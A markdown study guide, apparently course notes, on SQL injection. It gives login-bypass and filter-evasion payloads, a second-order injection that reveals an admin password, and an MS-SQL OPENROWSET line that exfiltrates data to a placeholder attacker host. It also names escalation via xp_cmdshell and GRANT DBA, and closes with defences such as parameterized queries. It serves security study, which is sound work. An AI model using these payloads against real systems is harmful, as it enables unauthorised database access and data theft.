# Injecting Code

## Into Interpreted Language
Attackers' input gets passed directly to the interpreter and runs as if it’s legit code.  
- Depends upon the language targeted.  
- Programming technique employed by the application developer.  
- Supplying unexpected syntax may cause read errors → check for indication of code injection vulnerability.  

## Injecting Into SQL
- Databases are used by almost all web applications to store data like user details, prices, account statements, etc.  
- By editing certain commands or statements and using vulnerable web parts, we can read, update, add, and delete data in the database.  

## Retrieving Hidden Data
Check if SQL injection is possible or not:  
- Try single quotation or double quotation as input.  
- Try `--` → observe the response.  
- Try `%` → if the server is interacting with the back-end database, submitting `%` may return some table or data.  
- Try `' OR 1=1--` → will bypass any true statement check, as `1=1` is always true.  
- Try supplying a mathematical expression that is equivalent to the original numerical value.  

**Useful notes:**  
- Use ASCII commands and quotes.  
- Remember:  
  - spaces ⇔ `+` or `%20`  
  - `+` ⇔ `%2b`  
  - `;` ⇔ `%3b`  

## Bypassing a Login
Every login page is connected to the backend most of the time, where it checks for username and password. If they match, it lets you log in.  

- We can bypass this login check if we know a username.  
- Example:  
```
SELECT * FROM USERS WHERE USERNAME = 'ADMIN'--' AND PASSWORD = 'FOO'
```
This is equivalent to:  
```
SELECT * FROM USERS WHERE USERNAME = 'ADMIN'
```
⇒ This way, the password check has been bypassed altogether.  

- If you don’t know a username, you can use:  
```
USERNAME = ' OR 1=1--
```
- Since `1=1` is always true, this can bypass the check.  

## Subverting Application Logic
- Example: username = `wiener` and password = `bluecheese`.  
- This can be bypassed using:  
  - If you have a username like `administrator`, try:  
    ```
    administrator'--
    ```
  - If you don’t have a username, then try:  
    ```
    username = admin
    password = ' OR 1=1--
    ```  

## Injecting into Different Statement Types
The most common types of SQL statements are:  

- **SELECT**  
- **INSERT**  
  - Use this for finding table column size and type, e.g.:  
    ```
    foo')--
    foo',1)--
    foo',1,1)--
    ```  
- **UPDATE**  
  - Example of bypassing password check and resetting the password:  
    ```
    update users set password='newsecret' where user='admin' or 1=1
    ```  
- **DELETE**  
- **The UNION operator**  
- **Fingerprinting the database**  
- **Extracting useful data**  

**Notes:**  
- If you don’t know the data type of columns in a table, you can always use:  
  ```
  SELECT NULL
  ```
- Use trial-and-error to find table names, column types, and column names.  

### Techniques
- If the `SELECT` statement is blocked or removed, try:  
  ```
  SeLeCt
  SELSELECTECT
  %53%54%4C%45%43%54
  ```
- In MySQL, comments can be inserted within keywords to bypass validation, for example:  
  ```
  SEL /*FOO*/ECT username,password FR/*foo*/OM users
  ```
- If the defense filter escapes or doubles up a single quotation mark, you can bypass it with escape quotations. Example:  
  ```
  aaaa'
  ```

## Second Order SQL Injection
- An attacker can register a username containing crafted input and then attempt to change their password.  
- Example:  
  ```
  'or 1 in (select password from users where username='admin')--
  ```
- When the attacker tries to change their password, the injected query will be executed → Revealing the admin password.  

**Note:** Not every attack is about stealing information — some just want to destroy your system/device.

## Using an out-of-band channel 

many time the webserver or browser dont let table to show or dont let the server to display stuff when any injection is done or taking place 
hence we think that the injection didn't worked or the website is not prone to sql injection 
but in reality everything is prone to injection its just not visibile to u 

so for that we will transfer the table or data to an out of band channel or network where we can see these data directly 

### MS-SQL

use OpenRowSet command can be used to open a connection to an external database and insert arbitary data into it 


`insert into openrowset(‘SQLOLEDB’,
‘DRIVER={SQL Server};SERVER=wahh-attacker.com,80;UID=sa;PWD=letmein’,
‘select * from foo’) values (@@version)`

note: u can specify port 80 or any port of your wish 


### Oracle 

1.  UTL_HTTP package can be used to make arbitrary HTTP requests to other hosts.
2. UTL_INADDR : is designed to resolve host names to ip address -> generate arbitary dns queries to controlled server
3. UTL_SMTP: used to send email (outbound email)
4. UTL_TCP: to open arbitary tcp sockets to send and recieve network data

### MYSQL
-> `select ...... into OUTFILE `=> command
-> specidied filename may contain a unc path, to direct the output to a file on your computer
-> to receive the file you will need to create a smb share on your own computer allows write access
-> use sniffer to confirm whether the target server is initiating any inbound connection to your computer 

**Reason of failure**: usually all database is location within a protected network whose perimeter firewall do not allow any inbound connection to internet or network 

**NOTE**: when u are restricted to accessing database entirely via your injection point into the web application them u should try to perform conditional responses or conditional errors

Tool :=> Absinthe
        -> automated tool to perform conditional repsonse on web application 
        -> can easily retrieve username,table, info ,table name, load filed info 
        -> will return all data in table format. you can retrieve it using download records tab

## Using Time Delays 

certain time you will not get any response using any of the previous technique. Hence you gotta use time-delays 
MS-SQL => `waitfor` command
       => `power` command 
Orcale => `UTL_HTTP` to connect to a non-existent server causing a timeout
MYsql  => use benchmark function to time dealy 

## Beyond SQL Injection => escalating the database attack

-> MS-SQL : xp_cmdshell
            xp_regread
            cp_regwrite
-> Oracle : by injecting the query `GRANT DBA TO PUBLIC` into the vulnerable field
-> MYSQL : mysql enable users to create user-defined functions by calling out to a compiled library file that contains the functions implementation

## Preventing SQL Injection 

=> escaping any single qoutation marks within user input by doubling them up
      -> using numerical sql queries
      -> using second-order sql injection attacks
=> use of stored procedure for all database access
      -> flaw in stored procedure own code
      -> using batch query 

### Parameterized Queries 
They split query structure from data. You declare the SQL with placeholders(?) then bind user data-so data can never change the SQL syntax
* How they stop Injection -> the DB engine treats bound values strictly as data not executable sql, so injected payload cant alter query logic

NOTE: 1. use them everywhere
          -> treat every single query as potentially dangerous dont selectively apply them 
      2. Parametrize every data item 
      3. You cant parametrie table/column names
          -> if u must let user choose table/column use a whitelist of allowed values (or strict validation)
## Defense in Depth (Three Layers)
=> application should use the lowest possible level of privileges when accessing database
  -> only read and write its own data
  -> if 90% of the database can be accessed using only read then no need of write
  -> if some file like user data is to be protected then level of access can be used
=> many enterprise database includes a huge amount default function that can be leveraged by attacker
   -> Unnecessary functions should be removed or disabled
=> all vendor-issued security patches should be evaluated,tested and applied in a timely way 

